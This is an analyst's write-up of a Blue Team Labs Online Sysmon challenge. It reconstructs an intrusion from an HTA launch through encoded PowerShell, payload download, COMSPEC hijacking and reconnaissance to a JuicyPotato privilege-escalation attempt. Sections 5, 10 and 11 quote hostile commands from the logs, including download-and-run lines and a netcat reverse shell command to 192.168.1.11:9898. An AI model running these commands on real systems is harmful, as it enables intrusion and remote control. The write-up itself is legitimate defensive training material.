# Sysmon Log Analysis — Windows Malware Execution and Privilege Escalation Investigation

**Role:** SOC Analyst L1  
**Platform:** Blue Team Labs Online (BTLO)  
**Challenge:** Log Analysis – Sysmon  
**Tools:** Timeline Explorer, jq, CyberChef  
**Evidence:** `sysmon-event.json`  
**Operating System:** Windows endpoint  
**Investigation Date:** 2021-05-07

---

## 1. Executive Summary

This investigation analyzes Sysmon telemetry collected from a Windows endpoint. The objective was to reconstruct suspicious activity, identify malicious process execution, understand the attacker's techniques, and assess the potential impact on the system.

The investigation revealed a multi-stage intrusion beginning with the execution of an HTA file through `mshta.exe`. This activity led to an encoded PowerShell command, followed by an in-memory payload execution stage and the download of an executable named `supply.exe`.

Subsequent activity included manipulation of the `COMSPEC` environment variable, execution of the legitimate Windows `ftp.exe` utility, and system reconnaissance through commands such as `ipconfig` and `whoami`.

The attacker later downloaded JuicyPotato, a tool associated with Windows privilege escalation through token impersonation. The final observed command attempted to execute JuicyPotato alongside Netcat to establish a reverse shell.

The available evidence supports a sequence of suspicious activities involving script execution, payload delivery, reconnaissance, and an attempted privilege-escalation operation.

**Evidence limitation:** The process-creation events show that suspicious commands were launched or attempted. They do not independently confirm that privilege escalation succeeded or that a reverse-shell connection was established.

## 2. Initial HTA Execution

During the analysis of Sysmon Event ID 1 (Process Creation), I identified a suspicious execution of `mshta.exe`.

The executable was launched from the Windows SysWOW64 directory and used to open an HTA file located in the user's Downloads directory.

**Observed command:**

```text
2021-05-07 12:20:26.626652 UTC

C:\Windows\SysWOW64\mshta.exe
C:\Users\IEUser\Downloads\updater.hta

Process ID: 2848
```

The execution of an HTA file through `mshta.exe` is suspicious because this legitimate Windows utility can be abused to execute malicious scripts.

This activity is consistent with a living-off-the-land technique, in which an attacker abuses legitimate system utilities to execute malicious functionality.

**MITRE ATT&CK:**

- T1218.005 — System Binary Proxy Execution: Mshta

## 3. Encoded PowerShell Execution

By examining the process activity associated with PID 2848, I identified a child process executing PowerShell.

**Observed command:**

```text
2021-05-07 12:20:27.041612

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-nop -w hidden -e aQBmACgA...

Process ID: 5876
```

Several command-line parameters indicate suspicious execution:

- `-nop`: Prevents PowerShell from loading the user's profile.
- `-w hidden`: Runs PowerShell with a hidden window.
- `-e`: Executes an encoded PowerShell command.

I extracted and decoded the command using CyberChef. The encoding was Base64 with UTF-16LE text encoding.

The decoded content revealed a script designed to decompress and execute another stage of code in memory using `GzipStream`.

This behavior is consistent with an attempt to conceal the script's functionality and make static analysis more difficult.

**MITRE ATT&CK:**

- T1059.001 — Command and Scripting Interpreter: PowerShell
- T1027 — Obfuscated Files or Information

## 4. In-Memory Payload Execution

Further analysis of the decoded PowerShell content revealed another stage designed to retrieve and execute a payload.

The script configured a network request using `WebRequest` and a browser-like User-Agent string intended to resemble Google Chrome. It also attempted to use the system's proxy and authentication context when making the request.

The final stage contained code using .NET reflection through `System.Reflection.Emit` to dynamically access native Windows APIs, including:

- `VirtualAlloc`
- `CreateThread`

The script allocated memory with Read, Write, and Execute permissions, copied shellcode into that memory region, and attempted to execute it through a newly created thread.

This behavior is consistent with in-memory shellcode execution.

**MITRE ATT&CK:**

- T1059.001 — Command and Scripting Interpreter: PowerShell
- T1027 — Obfuscated Files or Information

**Important distinction:** The supplied script describes shellcode execution through memory allocation and thread creation. It does not establish that code was injected into a separate process. Therefore, T1055 (Process Injection) is not assigned based on the available evidence.

## 5. Payload Download — supply.exe

Following the in-memory execution stage, another PowerShell process was observed downloading an executable named `supply.exe`.

**Observed command:**

```text
2021-05-07 12:21:33.000963 UTC

powershell -c Invoke-WebRequest
-Uri http://192.168.1.11:6969/supply.exe
-OutFile C:\Windows\Temp\supply.exe

Process ID: 6772
```

The command downloaded the executable from the internal address `192.168.1.11`, using port 6969, and saved it in the Windows temporary directory.

The use of PowerShell to retrieve an executable from a remote host is consistent with payload delivery during an intrusion.

**Indicators identified:**

| Indicator | Value |
|---|---|
| Remote IP | `192.168.1.11` |
| Remote port | `6969` |
| Downloaded file | `supply.exe` |
| Destination | `C:\Windows\Temp\supply.exe` |

**MITRE ATT&CK:**

- T1105 — Ingress Tool Transfer
- T1059.001 — Command and Scripting Interpreter: PowerShell

## 6. COMSPEC Environment Variable Manipulation

A subsequent process-creation event revealed an attempt to modify the `COMSPEC` environment variable.

**Observed command:**

```text
2021-05-07 12:21:43.270141 UTC

cmd /c set comspec=C:\windows\temp\supply.exe

Process ID: 8072
```

Under normal Windows configurations, `COMSPEC` points to the command interpreter, typically `cmd.exe`.

The observed command changes its value to:

```text
C:\Windows\Temp\supply.exe
```

This is significant because applications that rely on the `COMSPEC` variable to locate the command interpreter may execute the substituted binary instead.

The subsequent process activity provides additional context for this behavior. The manipulation appears intended to redirect command execution through the malicious executable, allowing it to act as a substitute command interpreter.

**MITRE ATT&CK consideration:**

- T1574 — Hijack Execution Flow (potentially relevant; the precise sub-technique requires further validation)

**Important distinction:** The event demonstrates an environment-variable modification attempt. It does not, by itself, establish persistence across system restarts.

## 7. ftp.exe Execution

Further examination of the process sequence revealed the invocation of the legitimate Windows `ftp.exe` utility.

**Observed event:**

```text
2021-05-07 12:22:39.505449 UTC

ftp.exe

Process ID: 6120
```

The investigation suggests that the attacker may have abused the interaction between `ftp.exe` and the previously modified `COMSPEC` environment variable.

Because the command interpreter reference had been redirected to `supply.exe`, the attacker could potentially use the legitimate FTP utility to trigger execution through the malicious executable.

This behavior is consistent with an attempt to use a legitimate Windows utility as part of an indirect command-execution chain.

**MITRE ATT&CK considerations:**

- T1202 — Indirect Command Execution (potentially relevant)
- T1574 — Hijack Execution Flow (potentially relevant)

The complete parent-child process relationship and command-line details should be reviewed before treating this technique as conclusively established.

## 8. System Reconnaissance

Following the suspicious execution chain, several commands were executed through `supply.exe`.

The use of `/c` indicates that the executable was being invoked with command-interpreter-style arguments.

### Network configuration discovery

```text
2021-05-07 12:22:41.528185 UTC

C:\windows\temp\supply.exe /c "ipconfig"

Process ID: 6708
```

The `ipconfig` command retrieves network configuration information, including IP addresses, subnet masks, and default gateways.

This information can help an attacker understand the compromised endpoint's network environment.

### User discovery

```text
2021-05-07 12:23:05.715403 UTC

C:\windows\temp\supply.exe /c "whoami"

Process ID: 1516
```

The `whoami` command identifies the security context under which the process is executing.

This can help an attacker determine which account has been compromised.

### Privilege discovery

```text
2021-05-07 12:23:56.242578 UTC

C:\windows\temp\supply.exe /c "whoami /priv"

Process ID: 7956
```

The `whoami /priv` command lists the privileges associated with the current access token.

This is particularly relevant because certain Windows privileges, including `SeImpersonatePrivilege`, may be abused during local privilege escalation.

**MITRE ATT&CK:**

- T1016 — System Network Configuration Discovery
- T1033 — System Owner/User Discovery
- T1059.003 — Command and Scripting Interpreter: Windows Command Shell

## 9. PyInstaller-Related File Extraction

During the analysis of Sysmon Event ID 11 (File Create), I identified the following file creation activity:

```text
C:\Users\IEUser\AppData\Local\Temp\_MEI53922\python27.dll
```

The `_MEI` directory naming convention is associated with PyInstaller applications executed in one-file mode.

PyInstaller extracts packaged dependencies into a temporary directory when the executable starts. These dependencies may include the Python interpreter DLL and other required components.

The presence of `python27.dll` in this directory is consistent with an executable packaged using Python 2.7 and PyInstaller.

This finding provides useful context about the possible implementation of the executable.

**MITRE ATT&CK consideration:**

- T1027.002 — Software Packing (possible contextual relevance; the file creation alone does not establish malicious packing or concealment)

**Evidence limitation:** The presence of this DLL is consistent with PyInstaller packaging, but it does not independently prove the complete origin or functionality of the executable.

## 10. JuicyPotato Download

After the reconnaissance activity, another command was observed downloading JuicyPotato from its public GitHub release repository.

**Observed command:**

```text
2021-05-07 12:28:57.682858 UTC

C:\windows\temp\supply.exe /c
"powershell -c Invoke-WebRequest
-Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-OutFile C:\Windows\Temp\juice.exe"

Process ID: 8244
```

JuicyPotato is a Windows privilege-escalation tool associated with the abuse of `SeImpersonatePrivilege`.

It uses Windows token impersonation behavior involving COM/DCOM activation to obtain a more privileged security context under vulnerable conditions.

The presence of this tool in the attack sequence is significant because the previous reconnaissance included a query for the user's privileges.

This suggests that the attacker was investigating whether the current account had privileges that could support local privilege escalation.

**MITRE ATT&CK:**

- T1105 — Ingress Tool Transfer
- T1134.001 — Access Token Manipulation: Token Impersonation/Theft (relevant to the intended privilege-escalation behavior)

## 11. Attempted Privilege Escalation and Reverse Shell

The final relevant process-creation event showed an attempt to execute JuicyPotato with Netcat as the program to launch.

**Observed command:**

```text
2021-05-07 12:31:24.745715 UTC

C:\windows\temp\supply.exe /c
"juicy.exe -l 9999 -p nc.exe
-a "192.168.1.11 9898 -e cmd.exe"
-t t
-c {B91D5831-B1BD-4608-8198-D72E155020F7}"

Process ID: 9796
```

The command-line arguments indicate the following intended behavior:

- `-l 9999`: Configures the JuicyPotato listener.
- `-p nc.exe`: Specifies Netcat as the program to launch.
- `-a`: Supplies the arguments passed to Netcat.
- `192.168.1.11 9898`: Specifies the remote address and port.
- `-e cmd.exe`: Requests execution of a Windows command shell through Netcat.
- `-t t`: Selects the token-creation method.
- `-c`: Specifies the COM CLSID used by JuicyPotato.

The command is consistent with an attempt to obtain a privileged execution context and establish a reverse shell to `192.168.1.11:9898`.

**MITRE ATT&CK considerations:**

- T1134.001 — Access Token Manipulation: Token Impersonation/Theft
- T1059.003 — Command and Scripting Interpreter: Windows Command Shell
- T1095 — Non-Application Layer Protocol (potentially relevant to the intended Netcat communication)

### Important filename discrepancy

The two relevant commands appear separately in the supplied logs:

**First event — download:**

```text
powershell -c Invoke-WebRequest
-Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-OutFile C:\Windows\Temp\juice.exe
```

**Second event — attempted execution:**

```text
juicy.exe -l 9999 -p nc.exe
-a "192.168.1.11 9898 -e cmd.exe"
-t t
-c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

The downloaded binary was saved as `juice.exe`, while the later command references `juicy.exe`.

This discrepancy is present in the observed evidence and should not be silently corrected. The available events do not establish whether the file was renamed, whether another copy existed, or whether the execution attempt succeeded.

Additional file-system telemetry, such as Sysmon Event ID 11, and process-creation records would be needed to investigate this discrepancy.

**Execution limitation:** The process-creation record demonstrates that the command was launched or attempted. It does not independently prove that JuicyPotato successfully obtained SYSTEM privileges or that the reverse shell connected.

Additional evidence, such as a subsequent process running as `NT AUTHORITY\SYSTEM` or network connection telemetry (Sysmon Event ID 3), would be required to confirm those outcomes.

## 12. Consolidated Attack Timeline

The following table summarizes the main events in chronological order, including the observed commands, their significance, and the corresponding MITRE ATT&CK techniques where sufficiently supported.

| Timestamp | Process / Command | Investigation Finding | MITRE ATT&CK |
|---|---|---|---|
| 12:20:26.626652 | `mshta.exe updater.hta` | Suspicious HTA execution from the user's Downloads directory. | T1218.005 |
| 12:20:27.041612 | `powershell.exe -nop -w hidden -e ...` | Hidden PowerShell execution using an encoded command. | T1059.001, T1027 |
| No separate timestamp supplied | PowerShell `GzipStream`, `VirtualAlloc`, `CreateThread` | Decoded script contained an in-memory shellcode execution stage. | T1059.001, T1027 |
| 12:21:33.000963 | `Invoke-WebRequest ... supply.exe` | Download of the payload from `192.168.1.11:6969`. | T1105, T1059.001 |
| 12:21:43.270141 | `set comspec=C:\windows\temp\supply.exe` | Modification of the command interpreter environment variable. | T1574 (potential) |
| 12:22:39.505449 | `ftp.exe` | Invocation of FTP utility in the suspicious process sequence. | T1202 (potential) |
| 12:22:41.528185 | `supply.exe /c "ipconfig"` | Network configuration discovery. | T1016, T1059.003 |
| 12:23:05.715403 | `supply.exe /c "whoami"` | Current user and security-context discovery. | T1033, T1059.003 |
| 12:23:56.242578 | `supply.exe /c "whoami /priv"` | Enumeration of token privileges, potentially to identify escalation opportunities. | T1059.003 |
| Not supplied | Creation of `...\_MEI53922\python27.dll` | Evidence consistent with PyInstaller extraction. | T1027.002 (possible relevance) |
| 12:28:57.682858 | `Invoke-WebRequest ... JuicyPotato.exe -OutFile ...\juice.exe` | Download of a privilege-escalation tool from GitHub, saved as `juice.exe`. | T1105 |
| 12:31:24.745715 | `juicy.exe ... nc.exe ... 192.168.1.11 9898` | Attempted JuicyPotato execution and reverse-shell operation. The command references `juicy.exe`, not the previously downloaded `juice.exe`. | T1134.001, T1059.003; T1095 (potential) |

*Note: Timestamps are presented as recorded in the supplied investigation notes. Some timestamps did not explicitly include a UTC suffix. Events without a supplied timestamp are marked accordingly.*

## 13. Key Indicators of Compromise

| Indicator Type | Value | Context |
|---|---|---|
| IP Address | `192.168.1.11` | Host used for payload delivery and intended reverse-shell destination. |
| Port | `6969` | Port used to download `supply.exe`. |
| Port | `9898` | Remote endpoint specified in the Netcat command. |
| File | `updater.hta` | Initial suspicious HTA file. |
| File | `supply.exe` | Payload downloaded to the Windows Temp directory. |
| File | `JuicyPotato.exe` | Original executable downloaded from GitHub. |
| File | `juice.exe` | Output filename specified in the download command. |
| File | `juicy.exe` | Filename referenced in the subsequent execution command. |
| Process | `mshta.exe` | HTA execution utility used in the initial activity. |
| Process | `powershell.exe` | Encoded script execution and payload download. |
| Process | `ftp.exe` | Legitimate utility observed in the suspicious execution sequence. |
| User context | `IEUser` | User directory identified in the supplied file path. |

## 14. Incident Assessment

The collected Sysmon telemetry reveals a multi-stage attack sequence involving suspicious HTA execution, encoded PowerShell, payload retrieval, environment-variable manipulation, system reconnaissance, and an attempted privilege-escalation operation.

The attacker appears to have used legitimate Windows utilities and scripting capabilities to execute malicious functionality.

The most significant findings are:

1. Execution of `updater.hta` through `mshta.exe`.
2. Hidden and encoded PowerShell execution.
3. In-memory shellcode execution logic.
4. Download of `supply.exe` from `192.168.1.11`.
5. Manipulation of the `COMSPEC` environment variable.
6. Reconnaissance through `ipconfig` and `whoami`.
7. Download of JuicyPotato, saved as `juice.exe`.
8. A subsequent command attempting to execute `juicy.exe` with Netcat.

The evidence strongly supports suspicious and malicious activity on the endpoint. However, the final success of privilege escalation and command-and-control establishment remains unconfirmed by the supplied process-creation evidence alone.

## 15. Recommended SOC Response

If this activity were detected in a production environment, the following actions would be recommended.

**Immediate containment**

- Isolate the affected endpoint from the network, following incident-response procedures.
- Preserve the original Sysmon logs and relevant forensic artifacts.
- Identify whether `supply.exe`, `juice.exe`, or `juicy.exe` exist on the system.
- Investigate active processes and network connections associated with the suspicious activity.

**Investigation**

- Review Sysmon Event ID 3 for connections to `192.168.1.11`.
- Examine Event ID 1 for additional child processes and their parent-child relationships.
- Review Event ID 11 for files created by the suspicious processes.
- Investigate the account's privileges and determine whether `SeImpersonatePrivilege` was available.
- Check for evidence of successful execution under `NT AUTHORITY\SYSTEM`.
- Search for additional persistence mechanisms and lateral movement activity.
- Investigate the `juice.exe` and `juicy.exe` filename discrepancy using file-system telemetry.

**Recovery and prevention**

- Remove malicious artifacts only after evidence preservation and authorization.
- Reset potentially compromised credentials according to incident-response procedures.
- Review endpoint security detections and PowerShell logging.
- Monitor for further communication with identified indicators.

## 16. Skills Demonstrated

- Windows Sysmon event analysis.
- Process execution and parent-child relationship investigation.
- PowerShell command-line analysis.
- Base64 and UTF-16LE decoding using CyberChef.
- Identification of suspicious in-memory execution behavior.
- Network indicator extraction.
- Windows environment-variable abuse investigation.
- System reconnaissance analysis.
- Privilege-escalation technique identification.
- MITRE ATT&CK mapping.
- Incident timeline reconstruction.
- SOC triage and incident-response recommendations.

## 17. Conclusion

This investigation demonstrates how Windows Sysmon telemetry can be used to reconstruct a multi-stage intrusion and identify suspicious behavior across process execution, scripting, payload delivery, reconnaissance, and attempted privilege escalation.

By correlating process-creation events and analyzing command-line arguments, I was able to identify the attacker's likely objectives and reconstruct the sequence of observed actions.

The investigation also highlights an important SOC principle: conclusions must be based on available evidence. Although the final command indicates an attempt to establish a privileged reverse shell, additional telemetry would be necessary to confirm successful privilege escalation and remote access.

This exercise strengthened my practical skills in Windows event analysis, process investigation, threat identification, and incident documentation.
